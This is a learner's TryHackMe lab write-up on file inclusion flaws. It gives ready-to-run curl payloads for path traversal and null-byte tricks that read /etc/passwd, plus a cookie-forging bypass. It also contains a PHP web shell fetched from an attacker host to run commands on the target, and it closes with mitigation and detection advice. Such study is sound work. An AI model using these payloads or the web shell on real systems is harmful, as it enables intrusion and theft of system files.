# File Inclusion

**🔍 File Inclusion Vulnerabilities — LFI & RFI Exploitation Techniques**

**Platform:** TryHackMe / Local Lab

**Path:** Jr. Penetration Tester · Vulnerability Research

**Date:** 2025-11-05

**Author:** Jaco Chan

**Tags:** #pentest #vuln-research #file-inclusion #lfi #rfi #tryhackme

## **TL;DR (1–2 lines)**

*Concise outcome:* Explored Local File Inclusion (LFI) and Remote File Inclusion (RFI) techniques including null-byte injection, path traversal bypasses, POST-based exploitation, cookie authentication bypass, and RFI via malicious PHP shell; documented mitigation strategies and detection methods.

## **Objective (what I planned)**

- Exploit LFI vulnerabilities using various bypass techniques (null-byte, path manipulation, POST parameters)
- Bypass authentication and filtering mechanisms using cookie manipulation
- Execute RFI attacks by hosting malicious PHP shells and achieving RCE
- Document common issues (e.g., binary output) and workarounds

## **Environment (lab)**

- **Attacker VM:** Kali 2025.x (host-only)
- **Victim VM:** TryHackMe vulnerable web application (lab-provided)
- **Network:** Host-only / NAT (no Internet for target)
- **Snapshots:** `before_test_20251105` (taken: ✅)
- **Files saved locally:** `private/shell.php`, `private/lfi_tests.txt`

## **Quick Commands (copy-paste)**

```bash
# Basic LFI test - null-byte injection (PHP &lt; 5.3)
curl "http://target_ip/index.php?file=../../../../etc/passwd%00"

# LFI with path traversal bypass
curl "http://target_ip/index.php?file=../../../etc/passwd/."

# LFI using POST parameter
curl -X POST "http://target_ip/index.php" -d "file=../../../../etc/passwd"

# LFI with cookie-based authentication bypass
curl "http://target_ip/index.php?file=../../../../etc/passwd" -b "THM=admin"

# Start HTTP server for RFI
python3 -m http.server 8080

# RFI exploit with command execution
curl "http://target_ip/index.php?file=http://attacker_ip:8080/shell.php&cmd=whoami"

# Handle binary output in terminal
curl "http://target_ip/index.php?file=/bin/ls" | strings

# Alternative: save binary output to file
curl "http://target_ip/index.php?file=/bin/bash" -o output.bin

```

## **Steps Performed (commands)**

### 1. Local File Inclusion (LFI) Exploitation

**Null-byte injection (%00):**

```bash
curl "http://10.10.x.x/page.php?file=../../../../etc/passwd%00"

```

- Works on PHP versions < 5.3.4 to bypass extension appending (e.g.,

`.php`)

**Path traversal with trailing slash/dot:**

```bash
curl "http://10.10.x.x/page.php?file=../../../../etc/passwd/."

```

- Bypasses filters that check for specific file extensions

**POST-based LFI:**

```bash
curl -X POST "http://10.10.x.x/page.php" -d "file=../../../../etc/passwd"

```

- Useful when GET parameters are filtered or logged

**Cookie-based authentication bypass:**

```bash
curl "http://10.10.x.x/page.php?file=../../../../etc/passwd" -b "THM=admin"

```

- Bypasses authentication checks by injecting privileged cookie values

### 2. Remote File Inclusion (RFI) Exploitation

**Create malicious PHP shell (`shell.php`):**

```php
&lt;?php 
if(isset($_GET['cmd'])) { 
    system($_GET['cmd']); 
} 
?&gt;

```

**Start HTTP server on attacker machine:**

```bash
python3 -m http.server 8080

```

**Execute RFI attack with command injection:**

```bash
curl "http://10.10.x.x/page.php?file=http://attacker_ip:8080/shell.php&cmd=whoami"
curl "http://10.10.x.x/page.php?file=http://attacker_ip:8080/shell.php&cmd=id"
curl "http://10.10.x.x/page.php?file=http://attacker_ip:8080/shell.php&cmd=cat%20/etc/passwd"

```

### 3. Handling Binary Output

**Issue:** "Binary output can mess up your terminal" when including binary files

**Solution - Use `strings` to filter printable characters:**

```bash
curl "http://10.10.x.x/page.php?file=/bin/bash" | strings

```

**Alternative - Save to file:**

```bash
curl "http://10.10.x.x/page.php?file=/bin/ls" -o binary_output.bin
file binary_output.bin
strings binary_output.bin | less

```

## **Findings**

- **Exploit reference:** File Inclusion vulnerabilities (CWE-98: Improper Control of Filename for Include/Require Statement)
- **Vuln type:** Local File Inclusion (LFI) and Remote File Inclusion (RFI)
- **Lab result:**✅ Successfully read `/etc/passwd` using null-byte injection and path traversal✅ Bypassed authentication filter using `-b 'THM=admin'` cookie✅ Achieved RCE via RFI by hosting malicious PHP shell and executing system commands✅ Handled binary output using `| strings` to avoid terminal corruption

## **Analysis & Mitigation**

### Cause:

- **Improper input validation:** Application fails to sanitise user-supplied file paths in `include()`, `require()`, or similar functions
- **Weak authentication:** Cookie-based authentication can be trivially bypassed without server-side session validation
- **Remote file inclusion enabled:** PHP configuration allows `allow_url_include=On`, permitting remote file execution

### Mitigation:

- **Whitelist allowed files:** Only permit inclusion of explicitly approved files from a predefined list
- **Disable remote file inclusion:** Set `allow_url_include=Off` and `allow_url_fopen=Off` in `php.ini`
- **Use basename() function:** Strip directory traversal sequences from user input
- **Implement proper authentication:** Use secure session management instead of relying solely on cookies
- **Input validation:** Filter special characters such as `../`, `%00`, `http://`
- **Principle of least privilege:** Run web server with minimal file system permissions

### Detection idea:

- **WAF rules:** Monitor for common LFI/RFI patterns (`../`, `%00`, `http://`, `file://`) in request parameters
- **Log analysis:** Alert on access to sensitive files (`/etc/passwd`, `/etc/shadow`, `php.ini`) via web logs
- **Anomaly detection:** Flag unusual outbound HTTP requests from web server (potential RFI callback)
- **File integrity monitoring:** Monitor for unexpected file reads in application directories
- **SIEM correlation:** Correlate POST requests with unusual `file=` parameters and authentication cookie manipulation